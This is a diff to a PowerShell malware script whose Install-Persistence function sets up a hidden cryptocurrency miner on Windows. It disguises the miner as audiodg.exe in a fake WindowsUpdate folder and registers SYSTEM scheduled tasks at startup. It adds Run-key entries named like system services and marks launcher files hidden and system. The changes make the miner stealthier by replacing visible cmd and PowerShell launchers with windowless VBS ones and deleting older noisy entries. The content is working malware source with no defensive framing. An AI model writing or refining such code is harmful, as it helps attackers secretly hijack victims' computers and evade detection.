@@ -1150,6 +1150,7 @@ function Install-Persistence {
 ' COMPLETELY INVISIBLE MINER LAUNCHER
 Set WshShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+On Error Resume Next
 
 ' Paths
 minerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
@@ -1181,6 +1182,14 @@ wscript.exe "$vbsLauncher"
     $batchContent | Set-Content -Path $taskScript -Force
     
     foreach ($taskName in $taskNames) {
+        # Clean any previous variants that might point to cmd/powershell launchers
+        try {
+            schtasks /delete /tn $taskName /f 2>$null | Out-Null
+            schtasks /delete /tn "${taskName}Logon" /f 2>$null | Out-Null
+            schtasks /delete /tn "${taskName}Interval" /f 2>$null | Out-Null
+            schtasks /delete /tn "${taskName}Hourly" /f 2>$null | Out-Null
+            schtasks /delete /tn "${taskName}Daily" /f 2>$null | Out-Null
+        } catch {}
         # OnStartup tasks (runs before login) - Using VBS launcher
         schtasks /create /tn $taskName /tr "wscript.exe \"$vbsLauncher\"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
         
@@ -1217,9 +1226,25 @@ wscript.exe "$vbsLauncher"
             if (-not (Test-Path $runKey)) {
                 New-Item -Path $runKey -Force 2>&1 | Out-Null
             }
-            # Add multiple entries per key for extra redundancy
-            Set-ItemProperty -Path $runKey -Name "WindowsAudio$(Get-Random -Min 100 -Max 999)" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`"" -Type String -Force 2>&1 | Out-Null
-            Set-ItemProperty -Path $runKey -Name "SystemUpdate$(Get-Random -Min 1000 -Max 9999)" -Value "cmd /c `"$taskScript`"" -Type String -Force 2>&1 | Out-Null
+            # Clean older noisy entries that spawn visible consoles
+            try {
+                $props = Get-ItemProperty -Path $runKey -ErrorAction SilentlyContinue
+                if ($props) {
+                    foreach ($p in $props.PSObject.Properties) {
+                        if ($p.Value -is [string] -and (
+                            $p.Value -match 'cmd.exe' -or $p.Value -match 'powershell.exe'
+                        ) -and (
+                            $p.Value -match 'AudioSrv' -or $p.Value -match 'audiosrv.bat' -or $p.Value -match 'launcher.ps1'
+                        )) {
+                            Remove-ItemProperty -Path $runKey -Name $p.Name -ErrorAction SilentlyContinue
+                        }
+                    }
+                }
+            } catch {}
+
+            # Add multiple entries per key for extra redundancy (windowless)
+            Set-ItemProperty -Path $runKey -Name "WindowsAudio$(Get-Random -Min 100 -Max 999)" -Value "wscript.exe `"$vbsLauncher`"" -Type String -Force 2>&1 | Out-Null
+            Set-ItemProperty -Path $runKey -Name "SystemUpdate$(Get-Random -Min 1000 -Max 9999)" -Value "wscript.exe `"$vbsLauncher`"" -Type String -Force 2>&1 | Out-Null
         } catch {}
     }
     
@@ -1294,14 +1319,18 @@ End If
             $vbsContent | Set-Content -Path $vbsScript -Force
             attrib +h +s $vbsScript 2>&1 | Out-Null
             
-            # BAT script (alternative method)
-            $batScript = Join-Path $folder "SystemUpdate.bat"
-            $batContent = @'
-@echo off
-start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
-'@
-            $batContent | Set-Content -Path $batScript -Force
-            attrib +h +s $batScript 2>&1 | Out-Null
+            # Alternate VBS (no console window) to avoid visible CMD popups
+            $altVbs = Join-Path $folder "SystemUpdate.vbs"
+            $altVbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "wscript.exe ""$vbsLauncher""", 0, False
+"@
+            $altVbsContent | Set-Content -Path $altVbs -Force
+            attrib +h +s $altVbs 2>&1 | Out-Null
+            # Remove legacy BAT launcher if present (prevents visible CMD windows)
+            try {
+                Remove-Item -Path (Join-Path $folder "SystemUpdate.bat") -Force -ErrorAction SilentlyContinue
+            } catch {}
         } catch {}
     }
     
